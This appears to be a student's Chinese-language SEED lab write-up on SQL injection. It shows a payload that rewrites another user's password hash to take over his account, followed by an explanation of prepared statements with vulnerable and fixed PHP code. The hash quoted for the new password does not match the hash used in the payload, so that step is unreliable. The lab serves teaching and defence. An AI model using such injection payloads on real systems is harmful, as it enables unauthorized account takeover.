改变 Boby 的工资后，Alice 仍然心怀不满，所以想把 Boby 的密码改成知道的密码，这样就可以登录他的账户并做进一步的破坏。需要证明你可以使用新密码成功登录 Boby 的账户。值得一提的是，数据库存储的是密码的哈希值，而不是明文密码字符串。可以再次查看 unsafe_edit_backend.php 代码，了解密码是如何存储的。它使用 SHA1 哈希函数来生成密码的哈希值。因为密码是被特殊编码的，所以准备新密码为 shenlingwang，然后将其用 SHA1 函数在线编码，得到 dfa7d5dad03d816b08a9f25c0c75a0bc0b92d1b8。将对应的密码存入数据库，设定使用的注入为 alice', Password='21bc9b529e627b2b035aaf9bf5357db61ead2c3d' WHERE ID=2-- ，因为哈希值是字符串，所以要加引号，修改后尝试登录 Boby 的页面，如下：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601185334921.png" alt="image-20260601185334921" style="zoom:50%;" />



------

#### Task 4: Countermeasure — Prepared Statement

SQL 注入漏洞的根本问题是未能将代码与数据分离。在构造 SQL 语句时，程序知道哪部分是数据、哪部分是代码。不幸的是，当 SQL 语句被发送到数据库时，边界已经消失；SQL 解释器看到的边界可能与开发人员设置的原始边界不同。要解决这个问题，确保服务器端代码和数据库中的边界视图一致非常重要。最安全的方法是使用预处理语句。

在编译步骤中，查询首先经过解析和规范化阶段，在这个阶段检查查询的语法和语义。下一阶段是编译阶段，其中关键字（如 SELECT、FROM、UPDATE 等）被转换为机器可理解的格式。基本上，在这个阶段，查询被解释。在查询优化阶段，会考虑多种执行查询的计划，从中选择最佳优化计划。选定的计划存储在缓存中，因此当下一个查询到来时，会与缓存中的内容进行比较；如果已经存在于缓存中，则跳过解析、编译和查询优化阶段。编译后的查询随后被传递给执行阶段并实际执行。预处理语句在编译之后、执行步骤之前发挥作用。预处理语句会经过编译步骤，被转换成一个带有空占位符的预编译查询。要运行这个预编译查询，需要提供数据，但这些数据不会经过编译步骤；相反，它们被直接插入到预编译查询中，并发送到执行引擎。因此，即使数据中包含 SQL 代码，由于没有经过编译步骤，这些代码只会被视为数据的一部分，没有任何特殊含义。这就是预处理语句防止 SQL 注入攻击的原理。

下面是一个如何在 PHP 中编写准备语句的示例。在下面的示例中，我们使用了 SELECT 语句。我们展示了如何使用准备语句重写易受 SQL 注入攻击的代码。

```php
 $sql = "SELECT name, local, gender
	 	FROM USER_TABLE
	 	WHERE id = $id AND password =’$pwd’ ";
 $result = $conn->query($sql)
```

上述代码容易受到 SQL 注入攻击。可将其重写如下：

```php
$stmt = $conn->prepare("SELECT name, local, gender
 		FROM USER_TABLE
		 WHERE id = ? and password = ? ");
 // Bind parameters to the query
 $stmt->bind_param("is", $id, $pwd);
 $stmt->execute();
 $stmt->bind_result($bind_name, $bind_local, $bind_gender);
 $stmt->fetch();
```

利用预处理语句机制，将向数据库发送 SQL 语句的过程分为两步。第一步是只发送代码部分，即不包含实际数据的 SQL 语句。这就是准备步骤。从上面的代码片段中我们可以看到，实际数据被问号（?） 完成这一步后，我们使用 bindparam() 将数据发送到数据库。数据库只会将这一步发送的所有数据视为数据，而不再是代码。它会将数据与准备语句中相应的问号绑定。在 bindparam() 方法中，第一个参数 “is ”表示参数的类型： i “表示 𝑖𝑑中的数据为整数类型，”𝑠"表示 pwd 中的数据为字符串类型。
进入 www.seedlabsqlinjection.com/defense，通过修改 unsafe.php 使该网站能够防御SQL注入攻击。

首先对网站进行SQL攻击测试，发现其能够被SQL注入攻击：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601191016058.png" alt="image-20260601191016058" style="zoom:50%;" />

原本使用 query() 直接执行拼接的 SQL 字符串，导致代码和数据没有被区分，输入特殊字符会被识别成代码从而被攻击。根据上面的预处理示例代码，结合实际输入输出修改得到编辑代码，首先发送 SQL 模板，即为代码部分，然后再接收填入代码块里的数据，这样输入的字符只会被识别为数据内容，而不会进入代码。用占位符 ？ 来代替用户输入。输入类型都为字符串，因此为 ‘ SS ’。然后 result 根据给出的 result 进行扩展。

进入docker，进入 /var/www/SQL_Injection/defense ，编辑 unsafe.php：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601191552014.png" alt="image-20260601191552014" style="zoom:50%;" />

修改后发现已经被防御：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601191527740.png" alt="image-20260601191527740" style="zoom:50%;" />
